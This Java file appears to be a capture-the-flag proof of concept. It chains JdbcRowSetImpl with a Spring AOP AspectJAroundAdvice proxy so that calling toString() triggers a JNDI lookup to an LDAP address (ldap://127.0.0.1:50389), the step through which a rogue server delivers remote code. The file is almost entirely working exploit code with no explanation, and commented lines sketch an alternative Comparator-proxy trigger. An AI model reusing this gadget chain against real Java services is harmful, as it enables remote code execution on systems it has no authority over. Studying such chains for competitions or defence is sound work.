package com.example.ezjav.solution;

import com.sun.rowset.JdbcRowSetImpl;
import org.aopalliance.aop.Advice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.ProxyFactory;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Comparator;

public class Poc02 {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/99b8ce");
        Method declaredMethod = jdbcRowSet.getClass().getDeclaredMethod("getDatabaseMetaData");

//        Person person = new Person();
//        Method declaredMethod = Person.class.getDeclaredMethod("getName");
        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();
        SingletonAspectInstanceFactory instanceFactory = new SingletonAspectInstanceFactory(jdbcRowSet);
        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(declaredMethod, pointcut, instanceFactory);
        ProxyFactory proxyFactory = new ProxyFactory(jdbcRowSet);
        proxyFactory.addAdvice(aspectJAroundAdvice);

        Object proxy = proxyFactory.getProxy();
        proxy.toString();
        //        Object o = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Comparator.class},(InvocationHandler) proxy);
//        o.compare("aaa", "bbb");


    }
}
